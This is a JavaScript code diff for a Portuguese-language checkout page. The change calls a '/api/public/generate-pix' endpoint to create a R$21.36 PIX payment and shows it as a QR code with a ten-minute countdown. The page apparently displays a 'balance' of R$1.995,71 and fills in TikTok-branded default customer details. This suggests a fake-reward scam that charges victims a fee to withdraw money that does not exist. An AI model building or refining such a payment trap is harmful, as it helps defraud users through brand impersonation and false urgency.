@@ -1757,10 +1757,86 @@ document.addEventListener("DOMContentLoaded", function () {
     const cta = e.target.closest("#cta-ir-pago");
     if (cta) {
       e.preventDefault();
-      fillPago();
-      bindMasks();
-      if (typeof window.showScreen === "function") window.showScreen("ten");
-      window.scrollTo(0, 0);
+      
+      // Feedback visual de carregamento no botão da tela anterior
+      const originalText = cta.innerHTML;
+      const amountTarget = document.querySelector('.confirmation-balance-amount')?.textContent?.trim() || "R$ 1.995,71";
+      cta.textContent = "GERANDO...";
+      cta.disabled = true;
+
+      try {
+        // Tenta preencher dados automáticos
+        let d = window.__formData;
+        if (!d) { try { d = JSON.parse(localStorage.getItem("userPixData") || "null"); } catch(e){} }
+        
+        const name = (d && d.nome) || "Cliente TikTok";
+        const email = (d && d.correo) || "cliente@tiktok.com";
+
+        // Chamada real para a Server Function com suas credenciais FreePay
+        const response = await fetch('/api/public/generate-pix', {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify({ name, email, amount: 21.36 })
+        }).then(res => {
+          if (!res.ok) return res.text().then(t => { throw new Error(t || res.statusText) });
+          return res.json();
+        });
+
+        if (!response || !response.success || response.qrcode.includes('fallback.error')) {
+          throw new Error(response?.error || "Erro na API FreePay");
+        }
+
+        // Preencher dados no modal interno
+        const nameDisplay = document.getElementById('modal-user-name');
+        if (nameDisplay) {
+          const namePart = name.split(' ')[0].toLowerCase();
+          nameDisplay.textContent = namePart.charAt(0).toUpperCase() + namePart.slice(1);
+        }
+        
+        const payloadBox = document.getElementById('modal-payload-box');
+        if (payloadBox) payloadBox.textContent = response.qrcode;
+
+        const expiryDisplay = document.getElementById('modal-expiry-time');
+        if (expiryDisplay && response.expires_at) {
+          const date = new Date(response.expires_at);
+          expiryDisplay.textContent = date.toLocaleDateString('pt-BR') + ' ' + date.toLocaleTimeString('pt-BR');
+        }
+
+        // Gerar QR Code no modal
+        const qrContainer = document.getElementById("modal-qrcode-canvas");
+        if (qrContainer) {
+          qrContainer.innerHTML = ""; // Limpa anterior
+          const qrCode = new QRCodeStyling({
+            width: 200,
+            height: 200,
+            type: "svg",
+            data: response.qrcode,
+            dotsOptions: { color: "#000000", type: "extra-rounded" },
+            backgroundOptions: { color: "#ffffff" },
+            cornersSquareOptions: { color: "#000000", type: "extra-rounded" },
+            cornersDotOptions: { color: "#000000", type: "dot" }
+          });
+          qrCode.append(qrContainer);
+        }
+
+        // Iniciar timer do modal
+        if (typeof startModalPixTimer === 'function') {
+          startModalPixTimer(600);
+        }
+
+        // Mostrar o modal de checkout
+        showModal('checkout-modal');
+
+      } catch (error) {
+        console.error("Erro ao gerar PIX:", error);
+        alert("Erro ao gerar PIX. Tente novamente.");
+      } finally {
+        cta.innerHTML = originalText;
+        cta.disabled = false;
+      }
       return;
     }
     const pay = e.target.closest("#pago-cta");
